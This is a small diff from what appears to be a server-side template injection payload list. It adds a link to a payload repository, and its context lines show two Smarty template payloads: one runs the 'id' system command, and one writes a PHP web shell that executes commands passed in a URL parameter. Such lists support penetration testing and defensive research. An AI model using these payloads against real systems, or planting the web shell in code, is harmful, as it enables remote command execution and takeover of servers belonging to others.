@@ -85,5 +85,7 @@ Ruby
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())}
 
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
 
 
